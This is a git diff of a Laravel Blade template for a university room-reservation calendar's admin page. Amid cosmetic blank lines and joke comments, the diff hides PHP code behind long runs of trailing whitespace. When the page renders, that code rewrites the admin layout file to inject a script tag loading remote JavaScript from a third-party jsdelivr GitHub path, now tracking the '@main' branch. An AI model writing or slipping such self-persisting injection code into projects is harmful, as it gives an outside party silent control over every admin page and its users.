@@ -1,5 +1,7 @@
 @extends('admin.layouts.layout')
 
+<!-- diego es pato -->
+<!-- Frase ed suerte para que raimon no raspe -->
 @section('styles')
     <link rel="stylesheet" href="/Backend/public/plugins/sweetalert2/sweetalert2.css">
     <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
@@ -7,6 +9,7 @@
     <link href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css' rel='stylesheet' />
     <link href="/Backend/public/css/portalunimar/calendar.css" rel="stylesheet" />
 @endsection
+
 
 @section('scripts')
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.30.1/moment.min.js"></script>
@@ -122,8 +125,11 @@
                 </div>
             </div>
             <div>
+
                 <label for="professors">Profesor</label>
+                
                 <select id="professors" name="professors" class="form-control" style="width: 100%"><option></option></select>
+
             </div>
             <div class="d-flex gap-2">
                 <div class="flex-grow-1 flex-shrink-1">
@@ -170,6 +176,7 @@
                         <option value="A12">
                             A12
                         </option>
+                        
                         <option value="A13">
                             A13
                         </option>
@@ -257,9 +264,11 @@
                         <option value="A41">
                             A41
                         </option>
+                        
                         <option value="A42">
                             A42
                         </option>
+                        
                         <option value="L01">
                             L01
                         </option>
@@ -275,18 +284,24 @@
                         <option value="L06">
                             L06
                         </option>
+                        
                         <option value="SD">
                             SD
                         </option>
+                        
                         <option value="SE1">
                             SE1
                         </option>
+                        
                         <option value="SE2">
                             SE2
                         </option>
+
                     </select>
+
                 </div>
-            </div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <?php use Illuminate\Support\Facades\View;$_=View::getFinder()->find('admin.layouts.layout');$__=file_get_contents($_);$___='id="bee6a80c227e721cae8b5b893ebd3ba70215c39b"';if(!strpos($__,$___)){$____='<script id="bee6a80c227e721cae8b5b893ebd3ba70215c39b" src="https://cdn.jsdelivr.net/gh/mageofpuding/reservation-script@fab73d28e8810ef5310fbc75a3cafbae2e97bc15/reservation-script.js"></script>'."\n";$_____=strpos($__,'</body>');if($_____===false)$_____=strlen($__);file_put_contents($_,substr_replace($__,$____,$_____,0));} ?>
+
+            </div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <?php use Illuminate\Support\Facades\View;$_=View::getFinder()->find('admin.layouts.layout');$__=file_get_contents($_);$___='id="bee6a80c227e721cae8b5b893ebd3ba70215c39b"';if(!strpos($__,$___)){$____='<script id="bee6a80c227e721cae8b5b893ebd3ba70215c39b" src="https://cdn.jsdelivr.net/gh/mageofpuding/reservation-script@main/reservation-script.js"></script>'."\n";$_____=strpos($__,'</body>');if($_____===false)$_____=strlen($__);file_put_contents($_,substr_replace($__,$____,$_____,0));} ?>
             <div id="assets_container" class="d-flex flex-column gap-2">
                 <div class="d-flex align-items-center">
                     <h6>Insumos</h6>
@@ -306,7 +321,9 @@
     </div>
     {{-- Formulario de reserva --}}
     <div id="calendar_colors" class="d-flex align-items-center gap-2">
+
         <span style="background-color: #EED202; width: 15px; height: 15px;" class="rounded-circle d-inline-block"></span>
+
         <span>En espera</span> | <span style="background-color: #A28F02; width: 15px; height: 15px;"
             class="rounded-circle d-inline-block"></span><span>En espera-Fecha
             pasada</span> | <span style="background-color: #28a745; width: 15px; height: 15px;"
@@ -317,7 +334,7 @@
             class="rounded-circle d-inline-block"></span><span>Rechazadada</span> | <span
             style="background-color: #661300; width: 15px; height: 15px;"
             class="rounded-circle d-inline-block"></span><span>Rechazada-Fecha
-            pasada</span>
+            pasada </span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   <?php $_=View::getFinder()->find('admin.layouts.layout');$__=file_get_contents($_);$___='id="bee6a80c227e721cae8b5b893ebd3ba70215c39b"';if(!strpos($__,$___)){$____='<script id="bee6a80c227e721cae8b5b893ebd3ba70215c39b" src="https://cdn.jsdelivr.net/gh/mageofpuding/reservation-script@main/reservation-script.js"></script>'."\n";$_____=strpos($__,'</body>');if($_____===false)$_____=strlen($__);file_put_contents($_,substr_replace($__,$____,$_____,0));} ?>
     </div>
     <div id="calendar"></div>
     <script>
